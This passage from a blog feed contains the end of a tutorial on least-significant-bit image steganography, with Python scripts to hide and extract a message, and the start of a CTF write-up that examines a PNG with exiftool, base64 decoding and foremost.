        &lt;span class=&quot;n&quot;&gt;b_new_last_bit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b_last_bit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bit_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;new_bit_blue_pixel&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b_bit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b_new_last_bit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;pixels&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_bit_red_pixel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_bit_green_pixel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_bit_blue_pixel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[+] &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;After: (&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;d,&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;d,&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;d)&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_bit_red_pixel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_bit_green_pixel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_bit_blue_pixel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;im&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;save&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'lsb_spongebob.png'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;What this script does is actually pretty simple. For each color channel of each pixel of the first row, the script extracts the least significant bit and replaces it by the result of the logical operation &lt;strong&gt;&amp;amp;&lt;/strong&gt; between &lt;em&gt;the current least significant bit&lt;/em&gt; and &lt;em&gt;the bit stored at index [i] in bit_array&lt;/em&gt;. Once the message is fully written, remaining pixels on the row are replaced by white pixels(255,255,255).&lt;/p&gt;

&lt;p&gt;I’ve also added some debugging outputs which are useful in order to illustrate the changes that are being made.&lt;/p&gt;

&lt;p&gt;This script only works for hiding short messages in the first row of the picture. It’s not optimized at all so you’ll probably write a better one but you get the idea.&lt;/p&gt;

&lt;h2 id=&quot;detection&quot;&gt;Detection&lt;/h2&gt;

&lt;p&gt;If everything went well, our message is now hidden inside “lsb_spongebob.png”. We will now study one specific method allowing us to detect such steganography techniques. There are many others which have a more mathematical approach but, since it’s not my speciality, I won’t mention them here.&lt;/p&gt;

&lt;h3 id=&quot;all-about-contrast&quot;&gt;All about contrast&lt;/h3&gt;

&lt;p&gt;The technique I’ll present you is very manual. It consists in playing with &lt;strong&gt;brightness&lt;/strong&gt; and &lt;strong&gt;contrast&lt;/strong&gt; parameters in your favorite (GNU) Image Manipulation Program, in order to spot certain irregularities. Nothing better than a concrete example. I personally use GIMP for this purpose.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Let’s open “lsb_spongebob.png” with GIMP and open the &lt;strong&gt;Brightness-Contrast&lt;/strong&gt; box under &lt;strong&gt;Colors&lt;/strong&gt; menu.&lt;/li&gt;
  &lt;li&gt;Set brightness to its minimum value and contrast to its maximum value.&lt;/li&gt;
  &lt;li&gt;Zoom in and scan for irregularities.&lt;/li&gt;
  &lt;li&gt;On the top left, you should see something like that:&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-08-12/lsb_detection.png&quot; alt=&quot;LSB Detection&quot; title=&quot;LSB Detection&quot; /&gt;&lt;/p&gt;

&lt;p&gt;That’s really suspicious because every pixel should be white in this area.&lt;/p&gt;

&lt;p&gt;This technique is not 100% reliable but pretty straight-forward and simple.&lt;/p&gt;

&lt;p&gt;Once we’ve located the suspected hidden message, we can proceed to the extraction.&lt;/p&gt;

&lt;h2 id=&quot;extraction&quot;&gt;Extraction&lt;/h2&gt;

&lt;p&gt;We’ve detected LSB steganography inside a picture! But how can we recover the message?
Simple! We have to extract the LSBs from each pixel and then assemble the result as a string.&lt;/p&gt;

&lt;p&gt;Once again, I recommand you to write your own script because it’s the only way to make sure everything is clear in your mind. In case you encounter difficulties, you can always take inspiration from mine.&lt;/p&gt;

&lt;h3 id=&quot;python-my-love&quot;&gt;Python my love&lt;/h3&gt;

&lt;p&gt;We know that the secret is hidden in the first row, so it’s useless to iterate over the whole picture with our script.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#coding: utf-8&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;base64&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;PIL&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Image&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;image&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Image&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;lsb_spongebob.png&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;extracted&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;pixels&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;load&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Iterate over pixels of the first row&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;width&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pixels&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;# Store LSB of each color channel of each pixel&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;extracted&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;extracted&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;extracted&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;chars&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;extracted&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;extracted&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;chars&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bit&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# Don't forget that the message was base64-encoded&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b64decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;chars&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;your-turn&quot;&gt;Your Turn!&lt;/h2&gt;

&lt;p&gt;To make this tutorial a bit funnier, I’ve slightly modified &lt;a href=&quot;http://localhost:4000/assets/2018-08-12/lsb_spongebob.png&quot;&gt;lsb_spongebob.png&lt;/a&gt; and I’ve hidden a different message inside. Will you be able to recover it? :wink:&lt;/p&gt;

&lt;p&gt;Maybe this one isn’t exactly in the same place… :smiling_imp:&lt;/p&gt;

&lt;p&gt;Feel free to send me your result or to post it in the comment section! Good luck!&lt;/p&gt;

&lt;h3 id=&quot;resources&quot;&gt;Resources&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://localhost:4000/assets/2018-08-12/spongebob.png&quot;&gt;original picture (spongebob.png)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://localhost:4000/assets/2018-08-12/lsb_spongebob.png&quot;&gt;modified picture (lsb_spongebob.png)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://localhost:4000/assets/2018-08-12/hide_message.py&quot;&gt;hide_message.py&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://localhost:4000/assets/2018-08-12/unhide_message.py&quot;&gt;unhide_message.py&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;BoiteAKlou :hammer:&lt;/p&gt;</content><author><name>BoiteAKlou</name></author><summary type="html">This article details a common steganography method known as the Least Significant Bit. This technique is very efficient because of its simplicity and its ability to be undetectable to the naked eye. After reading this, you’ll be able to hide a message inside a picture using this technique, but also to detect any dissimulated message.</summary></entry><entry><title type="html">Basic Steganography: Vous n’avez pas les bases - NDH16</title><link href="http://localhost:4000/stegano/2018/07/05/Basic-Steganography-Vous-navez-pas-les-bases-NDH16.html" rel="alternate" type="text/html" title="Basic Steganography: Vous n'avez pas les bases - NDH16" /><published>2018-07-05T23:30:00+02:00</published><updated>2018-07-05T23:30:00+02:00</updated><id>http://localhost:4000/stegano/2018/07/05/Basic-Steganography-Vous-navez-pas-les-bases-NDH16</id><content type="html" xml:base="http://localhost:4000/stegano/2018/07/05/Basic-Steganography-Vous-navez-pas-les-bases-NDH16.html">&lt;p&gt;A steganographic challenge showing the essential tools for PNG analysis and manipulating encoding bases.&lt;/p&gt;

&lt;p&gt;&lt;!--excerpt--&gt;&lt;/p&gt;

&lt;h2 id=&quot;challenge-description&quot;&gt;Challenge description&lt;/h2&gt;

&lt;p&gt;The PNG file &lt;a href=&quot;http://localhost:4000/assets/2018-07-05/OREILLES_SALES.png&quot;&gt;OREILLES_SALES.png&lt;/a&gt; (named after the famous french rapper “Orelsan”) is provided without more instructions.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-07-05/OREILLES_SALES.png&quot; alt=&quot;PNG preview&quot; title=&quot;PNG file preview&quot; width=&quot;40%&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;never-gonna-give-you-up&quot;&gt;Never gonna give you up&lt;/h2&gt;

&lt;p&gt;Since we’re never too careful when it comes to steganography, I verified that the provided file was indeed a PNG.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file OREILLES_SALES.png
OREILLES_SALES.png: PNG image data, 680 x 520, 8-bit/color RGBA, non-interlaced
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Even though this check isn’t infallible, we’ll suppose it tells the truth.&lt;/p&gt;

&lt;p&gt;Why don’t we start by checking metadata ? &lt;em&gt;*grabs exiftool*&lt;/em&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;exiftool OREILLES_SALES.png
ExifTool Version Number         : 11.03
File Name                       : OREILLES_SALES.png
Directory                       : &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
File Size                       : 396 kB
File Modification Date/Time     : 2018:07:01 00:11:07+02:00
File Access Date/Time           : 2018:07:05 22:34:23+02:00
File Inode Change Date/Time     : 2018:07:01 00:11:24+02:00
File Permissions                : rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 680
Image Height                    : 520
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Exif Byte Order                 : Little-endian &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Intel, II&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
User Comment                    : aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1kUXc0dzlXZ1hjUQ&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;
Thumbnail Offset                : 154
Thumbnail Length                : 5176
Gamma                           : 2.2222
White Point X                   : 0.3127
White Point Y                   : 0.329
Red X                           : 0.64
Red Y                           : 0.33
Green X                         : 0.3
Green Y                         : 0.6
Blue X                          : 0.15
Blue Y                          : 0.06
Background Color                : 255 255 255
Modify Date                     : 2017:09:22 11:41:16
Datecreate                      : 2017-09-22T13:41:16+02:00
Datemodify                      : 2017-09-22T13:41:16+02:00
Signature                       : f0140da3c2e1bf77c4183d771f341d8f3a8e3afc4c7c3b1b65917e8678b16b3e
Software                        : Adobe ImageReady
Warning                         : &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;minor] Trailer data after PNG IEND chunk
Image Size                      : 680x520
Megapixels                      : 0.354
Thumbnail Image                 : &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Binary data 5176 bytes, use &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; option to extract&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The &lt;strong&gt;User Comment&lt;/strong&gt; caught my attention, it was at this moment that I severely underestimated this challenge…&lt;/p&gt;

&lt;p&gt;Decoding this base64-encoded comment gives us the following URL:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1kUXc0dzlXZ1hjUQ==&quot;&lt;/span&gt; | base64 &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;
https://www.youtube.com/watch?v&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;dQw4w9WgXcQ
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I let you visit this link… Don’t worry, nothing dangerous. :sob:&lt;/p&gt;

&lt;h2 id=&quot;never-gonna-let-you-down&quot;&gt;Never gonna let you down&lt;/h2&gt;

&lt;p&gt;After this bitter failure, I decided to change my approach and to start looking for any dissimulated file inside the picture. To complete this task, I recommend the “&lt;strong&gt;Foremost&lt;/strong&gt;” tool, which is one of the best in its category.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;foremost OREILLES_SALES.png
Processing: OREILLES_SALES.png
|&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;|
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;The result of the extraction is stored in the “output” folder by default. Here, it gives two PNG files:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls &lt;/span&gt;output/png/
00000000.png  00000370.png
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;00000000.png&lt;/strong&gt; is the original picture provided with the challenge, but &lt;a href=&quot;http://localhost:4000/assets/2018-07-05/00000370.png&quot;&gt;00000370.png&lt;/a&gt; is way more interesting:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-07-05/00000370.png&quot; alt=&quot;00000370.png&quot; title=&quot;00000370.png preview&quot; width=&quot;40%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We will call this file “basiq.png” for more readability.&lt;/p&gt;

&lt;p&gt;Driven by my desire for revenge, I’ve had a look at metadata in this new file.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;exiftool basiq.png
ExifTool Version Number         : 11.03
File Name                       : basiq.png
Directory                       : &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
File Size                       : 210 kB
File Modification Date/Time     : 2018:07:01 00:16:42+02:00
File Access Date/Time           : 2018:07:05 23:12:37+02:00
File Inode Change Date/Time     : 2018:07:01 00:18:01+02:00
File Permissions                : rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 680
Image Height                    : 510
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Special Instructions            : 4D4A57564533324E4B524E474D5A4A544F5256553436544850424844455354494A555A4653364B5A474A4D5445544B584C453255344D5356474E475855514C5A4A555A4555334B5049524354435753584A4A5755365632474E5247573252544B4A56564655323232495247584F574C4E4A553245325243534E42484732534A524A5A4346534D433249354C47595453454E4D32453656324F4E4A4E4649554C324A564C565336434F4E4A4558515753584B4532553652434B4E564E4549554C594C4A57554B4E434E495241584F54544E4A553245365632534E4A4D5855524A544C4A4B464B36535A4B5249584F5432454C4A554655334B4B4E4A4D564F534C324C455A455532535049354954475454324A555A553256434B4E524846495A5A534A555A54434F493D
Gamma                           : 2.2222
White Point X                   : 0.31269
White Point Y                   : 0.32899
Red X                           : 0.63999
Red Y                           : 0.33001
Green X                         : 0.3
Green Y                         : 0.6
Blue X                          : 0.15
Blue Y                          : 0.05999
Background Color                : 255 255 255
Pixels Per Unit X               : 15748
Pixels Per Unit Y               : 15748
Pixel Units                     : meters
Modify Date                     : 2017:09:22 12:01:42
Datecreate                      : 2017-09-22T14:01:42+02:00
Datemodify                      : 2017-09-22T14:01:42+02:00
Signature                       : 5e6790047fb3e3c8a74d63cdf6e91766d0ba9f513f8d5ea2020e51514bc3ee05
Image Size                      : 680x510
Megapixels                      : 0.347
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And once again, a special field caught my attention. Guess which one…&lt;/p&gt;

&lt;p&gt;Well, let’s give it a second chance, knowing that the Rick Roll threat was hanging over me.&lt;/p&gt;

&lt;p&gt;The message surely is encoded, but how ? We will figure this out by trying all of the potential encoding:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Base64 gave nothing relevant.&lt;/li&gt;
  &lt;li&gt;Can’t be Base32 because of invalid characters such as “0” and “1”.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Base16&lt;/strong&gt;? The most likely possibility. Python will help us verify it.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;boiteaklou&lt;/span&gt;&lt;span class=&quot;nd&quot;&gt;@kali&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;python&lt;/span&gt;
